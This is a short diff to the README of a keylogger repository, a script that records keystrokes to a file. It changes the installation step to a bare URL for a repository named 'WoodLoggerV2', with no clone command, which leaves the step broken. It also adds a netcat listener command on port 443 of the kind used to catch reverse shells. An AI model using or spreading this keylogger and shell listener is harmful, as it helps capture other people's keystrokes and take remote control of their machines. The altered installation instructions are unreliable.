@@ -13,6 +13,7 @@ This keylogger is a simple script that records keystrokes and logs them to a fil
 ## Installation
 1. Clone this repository:
    ```sh
-   git clone https://github.com/yourusername/keylogger.git
-   cd keylogger
+   https://github.com/ReeveszX64/WoodLoggerV2.git
    ```
+
+# Spawning a netcat server nc -lvnp 443
